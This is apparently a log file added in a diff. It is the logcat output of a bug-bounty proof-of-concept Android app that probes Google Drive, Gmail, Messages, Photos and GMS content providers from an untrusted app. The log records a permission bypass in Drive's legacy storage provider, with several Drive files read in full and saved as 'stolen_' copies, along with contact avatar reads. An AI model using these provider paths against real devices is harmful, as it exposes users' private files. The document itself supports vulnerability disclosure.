@@ -1,0 +1,106 @@
+--------- beginning of main
+07-10 05:59:33.015 31139 31139 D VRP_POC : === VRP PoC - Untrusted App Context ===
+07-10 05:59:33.015 31139 31139 D VRP_POC : UID: 10340
+07-10 05:59:33.015 31139 31139 D VRP_POC : PID: 31139
+07-10 05:59:33.015 31139 31139 D VRP_POC : Package: com.vrppoc
+07-10 05:59:33.015 31139 31139 D VRP_POC : 
+07-10 05:59:33.015 31139 31139 D VRP_POC : --- Drive SAF Provider (direct, no picker) ---
+07-10 05:59:33.015 31139 31139 D VRP_POC : [BLOCKED] content://com.google.android.apps.docs.storage/root: Permission Denial: opening provider com.google.android.apps.docs.common.storagebackend.StorageBackendContentProvider fro...
+07-10 05:59:33.016 31139 31139 D VRP_POC : [BLOCKED] content://com.google.android.apps.docs.storage/document/acc%3D1%3B0: Permission Denial: opening provider com.google.android.apps.docs.common.storagebackend.StorageBackendContentProvider fro...
+07-10 05:59:33.016 31139 31139 D VRP_POC : [BLOCKED] content://com.google.android.apps.docs.storage/document/acc%3D1%3B0/children: Permission Denial: opening provider com.google.android.apps.docs.common.storagebackend.StorageBackendContentProvider fro...
+07-10 05:59:33.016 31139 31139 D VRP_POC : [BLOCKED] content://com.google.android.apps.docs.storage/document/acc%3D1%3Bview%3Dmydrive/children: Permission Denial: opening provider com.google.android.apps.docs.common.storagebackend.StorageBackendContentProvider fro...
+07-10 05:59:33.016 31139 31139 D VRP_POC :   Attempting file read via SAF...
+07-10 05:59:33.016 31139 31139 D VRP_POC : [BLOCKED] SAF file read: Permission Denial: opening provider com.google.android.apps.docs.common.storagebackend.StorageBackendContentProvider fro...
+07-10 05:59:33.016 31139 31139 D VRP_POC : --- Drive LegacyStorageBackendContentProvider ---
+07-10 05:59:33.016 31139 31139 D VRP_POC :   Test 1: Feature flag bypass (invalid doc)...
+07-10 05:59:33.061 31139 31139 D VRP_POC : [BYPASS] Feature flag DISABLED - no SecurityException for openFile
+07-10 05:59:33.061 31139 31139 D VRP_POC :   Test 2: Reading real Drive files...
+07-10 05:59:33.061 31139 31139 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=8Pa7Q1UHKEp40Elqv_al4zhkwSo-MZlUMVCeFmADjBa0KhOVxi4YYSk=
+07-10 05:59:33.128 31139 31139 D VRP_POC : [VULN-QUERY] Web portal 1.xlsx: _id=acc=1;doc=encoded=8Pa7Q1UHKEp40Elqv_al4zhkwSo-MZlUMVCeFmADjBa0KhOVxi4YYSk=, document_id=acc=1;doc=encoded=8Pa7Q1UHKEp40Elqv_al4zhkwSo-MZlUMVCeFmADjBa0KhOVxi4YYSk=, _display_name=Web portal 1-IV YEAR CSE B- final.xlsx, _size=18954, mime_type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet, flags=455, last_modified=1666959195000, icon=null, content_sync_state_flags=1
+07-10 05:59:33.168 31139 31139 D VRP_POC : [VULN-READ] Web portal 1.xlsx: 18954 bytes FULL FILE!
+07-10 05:59:33.168 31139 31139 D VRP_POC :   First32: 504b0304140006000800000021009f3bdda08c01000089060000130008025b43
+07-10 05:59:33.168 31139 31139 D VRP_POC :   TYPE: ZIP/OOXML file!
+07-10 05:59:33.168 31139 31139 D VRP_POC :   SAVED: /data/user/0/com.vrppoc/files/stolen_Web_portal_1.xlsx
+07-10 05:59:33.168 31139 31139 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=7dZDIKqTW0sqf2-57guyZnZBpA-Ue8FtBvkIEpuUhGtU3n13ULXL4AE=
+07-10 05:59:33.176 31139 31139 D VRP_POC : [VULN-QUERY] Web portal 4.xlsx: _id=acc=1;doc=encoded=7dZDIKqTW0sqf2-57guyZnZBpA-Ue8FtBvkIEpuUhGtU3n13ULXL4AE=, document_id=acc=1;doc=encoded=7dZDIKqTW0sqf2-57guyZnZBpA-Ue8FtBvkIEpuUhGtU3n13ULXL4AE=, _display_name=Web portal 4-IV  YEAR CSE B.xlsx, _size=39289, mime_type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet, flags=455, last_modified=1666962930000, icon=null, content_sync_state_flags=0
+07-10 05:59:35.705 31139 31139 D VRP_POC : [VULN-READ] Web portal 4.xlsx: 39289 bytes FULL FILE!
+07-10 05:59:35.707 31139 31139 D VRP_POC :   First32: 504b0304140008080800ee315c5500000000000000000000000018000000786c
+07-10 05:59:35.707 31139 31139 D VRP_POC :   TYPE: ZIP/OOXML file!
+07-10 05:59:35.709 31139 31139 D VRP_POC :   SAVED: /data/user/0/com.vrppoc/files/stolen_Web_portal_4.xlsx
+07-10 05:59:35.709 31139 31139 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=sOhlwv_Lizop4BVKjzA7YBjTmv6JBCHk3jOtchzefrzcMpRy8SXNJpw=
+07-10 05:59:35.735 31139 31139 D VRP_POC : [VULN-QUERY] Untitled presentation.pdf: _id=acc=1;doc=encoded=sOhlwv_Lizop4BVKjzA7YBjTmv6JBCHk3jOtchzefrzcMpRy8SXNJpw=, document_id=acc=1;doc=encoded=sOhlwv_Lizop4BVKjzA7YBjTmv6JBCHk3jOtchzefrzcMpRy8SXNJpw=, _display_name=Untitled presentation.pdf, _size=3756, mime_type=application/pdf, flags=389, last_modified=1731864451414, icon=null, content_sync_state_flags=0
+07-10 05:59:35.777 31139 31139 D VRP_POC : [VULN-READ] Untitled presentation.pdf: 17584 bytes FULL FILE!
+07-10 05:59:35.778 31139 31139 D VRP_POC :   First32: 255044462d312e340a2520e2e3cfd30a330a300a6f626a0a3c3c0a2f54797065
+07-10 05:59:35.778 31139 31139 D VRP_POC :   TYPE: PDF!
+07-10 05:59:35.779 31139 31139 D VRP_POC :   SAVED: /data/user/0/com.vrppoc/files/stolen_Untitled_presentation.pdf
+07-10 05:59:35.780 31139 31139 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=nTgJt0L-kab4R1TMBylupt7LFk6Kuy980j-ZF7zQ_yxGW-HVF2xFUms=
+07-10 05:59:35.801 31139 31139 D VRP_POC : [VULN-QUERY] Prompt injection doc.pdf: _id=acc=1;doc=encoded=nTgJt0L-kab4R1TMBylupt7LFk6Kuy980j-ZF7zQ_yxGW-HVF2xFUms=, document_id=acc=1;doc=encoded=nTgJt0L-kab4R1TMBylupt7LFk6Kuy980j-ZF7zQ_yxGW-HVF2xFUms=, _display_name=Write the detail documentation on prompt injection vulnerability.pdf, _size=2723, mime_type=application/pdf, flags=389, last_modified=1684743004735, icon=null, content_sync_state_flags=0
+07-10 05:59:37.277 31139 31139 D VRP_POC : [VULN-READ] Prompt injection doc.pdf: 35844 bytes FULL FILE!
+07-10 05:59:37.278 31139 31139 D VRP_POC :   First32: 255044462d312e340a25d3ebe9e10a312030206f626a0a3c3c2f5469746c6520
+07-10 05:59:37.278 31139 31139 D VRP_POC :   TYPE: PDF!
+07-10 05:59:37.280 31139 31139 D VRP_POC :   SAVED: /data/user/0/com.vrppoc/files/stolen_Prompt_injection_doc.pdf
+07-10 05:59:37.281 31139 31139 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=SxJ0EnldYtpb1gQTwsdSVeQx0dMzJL8QdOGEspDNYqHCPYYhdHmKNAg=
+07-10 05:59:37.378 31139 31139 D VRP_POC : [VULN-QUERY] websiteregister.pdf: _id=acc=1;doc=encoded=SxJ0EnldYtpb1gQTwsdSVeQx0dMzJL8QdOGEspDNYqHCPYYhdHmKNAg=, document_id=acc=1;doc=encoded=SxJ0EnldYtpb1gQTwsdSVeQx0dMzJL8QdOGEspDNYqHCPYYhdHmKNAg=, _display_name=websiteregister-rijksoverheid-2024-05-30.pdf, _size=72356, mime_type=application/pdf, flags=389, last_modified=1720015354639, icon=null, content_sync_state_flags=0
+07-10 05:59:38.974 31139 31139 D VRP_POC : [NOFILE] Read websiteregister.pdf (provider accessible, doc not cached)
+07-10 05:59:38.974 31139 31139 D VRP_POC :   URI: content://com.google.android.apps.docs.storage.legacy/enc=encoded=dtV9zLfk3_l2GJLdmisj8hHl_D8AxWol9OaXsV9DQvnPSswTyCHbxPc=
+07-10 05:59:39.010 31139 31139 D VRP_POC : [VULN-QUERY] bug bounty folder: _id=acc=1;doc=encoded=dtV9zLfk3_l2GJLdmisj8hHl_D8AxWol9OaXsV9DQvnPSswTyCHbxPc=, document_id=acc=1;doc=encoded=dtV9zLfk3_l2GJLdmisj8hHl_D8AxWol9OaXsV9DQvnPSswTyCHbxPc=, _display_name=bug bounty , _size=null, mime_type=vnd.android.document/directory, flags=262476, last_modified=1708586208781, icon=null, content_sync_state_flags=0
+07-10 05:59:39.033 31139 31139 D VRP_POC : [NOFILE] Read bug bounty folder (provider accessible, doc not cached)
+07-10 05:59:39.033 31139 31139 D VRP_POC :   Test 3: openTypedAssetFile...
+07-10 05:59:39.171 31139 31139 D VRP_POC : [VULN] Legacy openTypedAssetFile: accessible!
+07-10 05:59:39.172 31139 31139 D VRP_POC : --- Drive Legacy call() Confused Deputy ---
+07-10 05:59:39.174 31139 31139 D VRP_POC : [NULL] Legacy call() returned null (method unrecognized or URI lookup failed)
+07-10 05:59:39.175 31139 31139 D VRP_POC : [NULL] Legacy call() with Drive SAF URI returned null
+07-10 05:59:39.175 31139 31139 D VRP_POC : --- Drive CrossAppStateProvider ---
+07-10 05:59:39.179 31139 31139 D VRP_POC : --- Gmail EmailProvider ---
+07-10 05:59:39.184 31139 31139 D VRP_POC : [BLOCKED] com.google.android.gmail.provider
+07-10 05:59:39.185 31139 31139 D VRP_POC : [BLOCKED] com.google.android.gm.email.provider
+07-10 05:59:39.186 31139 31139 D VRP_POC : --- Gmail/Messages FileProviders ---
+07-10 05:59:39.188 31139 31139 D VRP_POC : [BLOCKED] com.google.android.gm.fileprovider
+07-10 05:59:39.189 31139 31139 D VRP_POC : [BLOCKED] com.google.android.gm.composeimagefileprovider
+07-10 05:59:39.190 31139 31139 D VRP_POC : [BLOCKED] com.google.android.apps.messaging.fileprovider
+07-10 05:59:39.190 31139 31139 D VRP_POC : --- GMS Providers ---
+07-10 05:59:39.203 31139 31139 D VRP_POC : [NULL] Phenotype flags
+07-10 05:59:39.206 31139 31139 D VRP_POC : [UnsupportedOperationException] Auth accounts
+07-10 05:59:39.209 31139 31139 D VRP_POC : [NULL] Chimera modules
+07-10 05:59:39.209 31139 31139 D VRP_POC : --- Dialer PreferredSimFallback ---
+07-10 05:59:39.211 31139 31139 D VRP_POC : [BLOCKED] SimFallback: Permission Denial: opening provider com.android.dialer.preferredsim.impl.PreferredSimFallbackProvider from ProcessRecord...
+07-10 05:59:39.211 31139 31139 D VRP_POC : --- Photos PartnerContentProvider ---
+07-10 05:59:39.220 31139 31139 D VRP_POC : [NOFILE] Photos Partner (provider accessible, no file)
+07-10 05:59:39.258 31139 31139 D VRP_POC : [BLOCKED] Photos Partner call(): com.vrppoc is not authorized to access the content.
+07-10 05:59:39.258 31139 31139 D VRP_POC : --- Google Settings Partner ---
+07-10 05:59:39.279 31139 31139 D VRP_POC : [DATA] Google Settings: 18 rows
+07-10 05:59:39.279 31139 31139 D VRP_POC :   network_location_opt_in=1
+07-10 05:59:39.279 31139 31139 D VRP_POC :   client_id=android-google
+07-10 05:59:39.280 31139 31139 D VRP_POC :   search_client_id=ms-android-google
+07-10 05:59:39.280 31139 31139 D VRP_POC :   search_a2_client_id=ms-android-google
+07-10 05:59:39.280 31139 31139 D VRP_POC :   chrome_client_id=ms-android-google
+07-10 05:59:39.280 31139 31139 D VRP_POC :   maps_client_id=gmm-android-google
+07-10 05:59:39.280 31139 31139 D VRP_POC :   youtube_client_id=mvapp-android-google
+07-10 05:59:39.280 31139 31139 D VRP_POC :   market_client_id=am-android-google
+07-10 05:59:39.280 31139 31139 D VRP_POC :   voicesearch_client_id=ms-android-google
+07-10 05:59:39.280 31139 31139 D VRP_POC :   playtx_client_id=play-ms-android-google
+07-10 05:59:39.280 31139 31139 D VRP_POC :   playax_client_id=play-ad-ms-android-google
+07-10 05:59:39.280 31139 31139 D VRP_POC :   program_client_id=pg-android-google
+07-10 05:59:39.281 31139 31139 D VRP_POC :   program2_client_id=pg2-android-google
+07-10 05:59:39.281 31139 31139 D VRP_POC :   program3_client_id=pg3-android-google
+07-10 05:59:39.281 31139 31139 D VRP_POC :   rsvd_a2_client_id=ms-android-google
+07-10 05:59:39.281 31139 31139 D VRP_POC :   rsvd_a3_client_id=ms-android-google
+07-10 05:59:39.282 31139 31139 D VRP_POC : --- Messages AvatarContentProvider ---
+07-10 05:59:39.320 31139 31139 D VRP_POC : [VULN] Avatar read 512 bytes: content://com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider/contact_photo/1
+07-10 05:59:39.320 31139 31139 D VRP_POC :   Hex: 89504e470d0a1a0a0000000d49484452000000bd000000bd0806000000e6d77c
+07-10 05:59:39.345 31139 31139 D VRP_POC : [VULN] Avatar read 512 bytes: content://com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider/contact_photo/2
+07-10 05:59:39.346 31139 31139 D VRP_POC :   Hex: 89504e470d0a1a0a0000000d49484452000000bd000000bd0806000000e6d77c
+07-10 05:59:39.367 31139 31139 D VRP_POC : [VULN] Avatar read 512 bytes: content://com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider/avatar/1
+07-10 05:59:39.367 31139 31139 D VRP_POC :   Hex: 89504e470d0a1a0a0000000d49484452000000bd000000bd0806000000e6d77c
+07-10 05:59:39.376 31139 31139 D VRP_POC : [UnsupportedOperationException] Avatar query: query not supported
+07-10 05:59:39.376 31139 31139 D VRP_POC : --- Contacts/OtherContacts Providers ---
+07-10 05:59:39.377 31139 31139 D VRP_POC : [NULL] OtherContacts
+07-10 05:59:39.377 31139 31139 D VRP_POC : [NULL] Besties
+07-10 05:59:39.377 31139 31139 D VRP_POC : --- Photos SharouselContentProvider ---
+07-10 05:59:39.378 31139 31139 D VRP_POC : [NULL] Sharousel
+07-10 05:59:39.379 31139 31139 D VRP_POC : [NOFILE] Sharousel file (accessible)
+07-10 05:59:39.379 31139 31139 D VRP_POC : --- GMS Location/Emergency/Account ---
+07-10 05:59:39.379 31139 31139 D VRP_POC : [NULL] Location Reporting
+07-10 05:59:39.382 31139 31139 D VRP_POC : [IllegalArgumentException] Emergency Config: Unsupported URI: content://com.google.android.gms.thunderbird.config
+07-10 05:59:39.383 31139 31139 D VRP_POC : [NULL] Account State
+07-10 05:59:39.383 31139 31139 D VRP_POC : === ALL TESTS COMPLETE ===
